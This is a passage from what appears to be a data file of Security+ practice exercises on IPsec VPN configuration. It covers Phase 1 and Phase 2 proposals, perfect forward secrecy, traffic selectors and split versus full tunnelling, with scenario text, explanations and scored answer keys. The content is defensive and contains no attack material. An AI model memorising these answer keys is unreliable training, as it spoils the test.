            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'certmfa', text: 'Machine certificate + user MFA' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert','certmfa'], 'a-enc': ['aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert','certmfa'], 'b-enc': ['aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Set the Phase 2 selectors and transform for full-tunnel operation.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. AES-256-GCM is the only transform meeting the classification, and as an AEAD mode it binds confidentiality and integrity in one pass under one key.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'rec', text: '10.60.0.0/16 · records network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.61.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'rec', text: '10.60.0.0/16 · records network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.61.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'rec', text: '10.60.0.0/16 · records network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.61.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'rec', text: '10.60.0.0/16 · records network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.61.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['all'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['pool'], 'b-remote': ['all'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } },
      { id: 'p3', type: 'analyze', points: 1,
        prompt: 'The contractor’s proposed client profile is below. Which single line fails the data classification?',
        explanation: 'The Phase 2 transform is AES-128-CBC, below the mandated AES-256 — and Phase 2 is where the clinical records are actually encrypted, so a compliant Phase 1 does not rescue it. The rest is sound: certificates authenticate the device, SHA-256 and group 14 both clear the floor, PFS is enabled, and 0.0.0.0/0 on the remote selector is exactly what full-tunnel operation requires.',
        payload: { multi: false, lines: [
          { id: 'ln-auth', text: 'Authentication: Machine certificates' },
          { id: 'ln-p1', text: 'Phase 1 encryption: AES-256' },
          { id: 'ln-int', text: 'Phase 1 integrity: SHA-256' },
          { id: 'ln-pfs', text: 'Phase 2 PFS: enabled, group 14' },
          { id: 'ln-p2', text: 'Phase 2 transform: ESP / AES-128-CBC + HMAC-SHA-256' },
          { id: 'ln-sel', text: 'Remote selector: 0.0.0.0/0' }
        ] },
        answer: { selected: ['ln-p2'] } }
    ]
  },

  {
    id: 'sp-vpn-08', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Field engineers on hotel Wi-Fi',
    estMinutes: 5, policyFloor: ['no-psk','pfs','aes192-min'],
    scenario: 'Field engineers connect from hotel and airport Wi-Fi, so the path between laptop and concentrator is openly hostile and capture is entirely plausible. Company policy routes all their traffic through corporate egress. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Encryption is AES-192 minimum and shared secrets are not permitted on user devices. Configure the concentrator and the client profile.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Corporate network', type: 'network', subnet: '10.70.0.0/16', note: 'concentrator · 203.0.113.170' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.71.0.0/24', note: 'assigned to field laptops' },
      { id: 'siteC', label: 'All destinations', type: 'network', subnet: '0.0.0.0/0', note: 'full-tunnel egress' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. On a network where capture is plausible, forward secrecy is the control that matters most — it is what stops a later key compromise unlocking a session recorded in a hotel lobby today. AES-192 and AES-256 both clear the floor, but both ends must land on the same one. A machine certificate alone satisfies the no-shared-secrets rule, and the same certificate with user MFA layered on exceeds it — MFA alone would not, because the certificate is what authenticates the device to IKE.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'certmfa', text: 'Machine certificate + user MFA' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'certmfa', text: 'Machine certificate + user MFA' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert','certmfa'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert','certmfa'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Configure Phase 2 for full-tunnel operation from an untrusted network.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. Here the full-tunnel selector is a security control, not just a policy preference. The concentrator offers 0.0.0.0/0 as the network it protects and the client requests 0.0.0.0/0 as its remote, while the assigned pool address is the client-side selector at both ends — so even DNS lookups and general browsing leave the laptop encrypted, and the hotel network sees a single IPSec flow instead of a readable picture of what the engineer is doing. AES-128-CBC and 3DES fall below the AES-192 floor, leaving AES-192-CBC with HMAC-SHA-256 or AES-256-GCM.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'corp', text: '10.70.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.71.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'corp', text: '10.70.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.71.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'corp', text: '10.70.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.71.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'corp', text: '10.70.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.71.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['all'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['pool'], 'b-remote': ['all'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-09', cert: 'secplus', archetype: 'vpntunnel', objective: '1.4',
    topic: 'Cryptographic solutions', title: 'Pick an AEAD transform for the payments team',
    estMinutes: 5, policyFloor: ['no-psk','pfs','aes256-min'],
    scenario: 'The payments team’s remote-access profile is being rebuilt after a review found the tunnel was encrypting card data but authenticating it with a separate, older integrity algorithm. The reviewer asked for two changes: move to a single authenticated-encryption transform rather than an encrypt-then-MAC composition, and drop shared secrets in favour of per-device certificates. Card-data policy also requires AES-256 minimum, SHA-256 or better in Phase 1, a 2048-bit-equivalent group or better, perfect forward secrecy, and that all laptop traffic keeps traversing corporate egress for monitoring — the profile stays full-tunnel, only the crypto is changing.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Payments network', type: 'network', subnet: '10.80.0.0/16', note: 'concentrator · 203.0.113.200' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.81.0.0/24', note: 'assigned to payments laptops' },
      { id: 'siteC', label: 'All destinations', type: 'network', subnet: '0.0.0.0/0', note: 'full-tunnel egress, retained' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. A pre-shared key is a symmetric secret every device holds a copy of: it cannot identify which laptop connected, and losing one means rotating it everywhere. Certificates are asymmetric — each device holds its own private key and can be revoked individually. On integrity, note the reason SHA-1 goes: it is withdrawn by policy because the underlying hash is collision-weak, even though HMAC-SHA-1 itself is not directly broken by those attacks.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Per-device certificates' }, { id: 'certmfa', text: 'Per-device certificate + user MFA' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Per-device certificates' }, { id: 'certmfa', text: 'Per-device certificate + user MFA' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert','certmfa'], 'a-enc': ['aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert','certmfa'], 'b-enc': ['aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Build the Phase 2 SA: selectors, forward secrecy and the transform the reviewer asked for.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. AES-256-GCM is an AEAD mode — one pass, one key, ciphertext plus an authentication tag, so confidentiality and integrity are bound together rather than bolted on. That is exactly the finding: encrypt-then-separately-MAC arrangements are where implementation mistakes live. Read the transform list against BOTH stated constraints. AES-192-CBC with HMAC-SHA-256 is the closest miss and fails on each count independently — under the AES-256 floor, and the encrypt-then-MAC composition the reviewer named. AES-128-CBC and 3DES fail the same two harder, and AH does not encrypt at all. Only AES-256-GCM satisfies the key length and the single-transform AEAD finding together. The selectors stay full-tunnel because policy says so, not because the crypto rebuild touched them.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'pay', text: '10.80.0.0/16 · payments network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.81.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'pay', text: '10.80.0.0/16 · payments network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.81.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'pay', text: '10.80.0.0/16 · payments network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.81.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'pay', text: '10.80.0.0/16 · payments network' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.81.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['all'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['pool'], 'b-remote': ['all'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-10', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Split-tunnel the video-heavy design team',
    estMinutes: 5, policyFloor: ['pfs','aes192-min'],
    scenario: 'The design team’s full-tunnel profile is saturating the corporate internet link — their video calls and asset downloads are hauled to the office and straight back out again. The security review agreed to split-tunnel them: corporate traffic goes down the tunnel, everything else exits the local connection. The standing crypto floor is unchanged and applies here: AES-192 minimum at both phases, Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent group or better, and perfect forward secrecy. Authentication is out of scope tonight and either method already in use remains acceptable. Reconfigure the concentrator and the client profile.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Corporate network', type: 'network', subnet: '10.90.0.0/16', note: 'concentrator · 203.0.113.230' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.91.0.0/24', note: 'assigned to design laptops' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. Splitting the tunnel changes WHICH traffic is protected, not HOW WELL the protected traffic is protected — Phase 1 is untouched by that decision and must still clear the same floor. Worth stating plainly, because a split-tunnel change is often mistaken for a crypto relaxation. Authentication is genuinely open here: no peer authentication at all is still wrong, but PSK and certificates are both in use and both acceptable.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Machine certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['psk','cert'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['psk','cert'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Narrow the Phase 2 selectors so ONLY corporate traffic is tunnelled.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. Split tunnel is a selector change and nothing else: the concentrator now offers only 10.90.0.0/16 rather than 0.0.0.0/0, so the client encrypts corporate-bound traffic and sends the rest straight out locally. Take the trade honestly — the laptop’s general traffic is no longer filtered or logged by corporate egress, which is exactly why this needed a security review rather than a config change. On the transform, AES-128-CBC 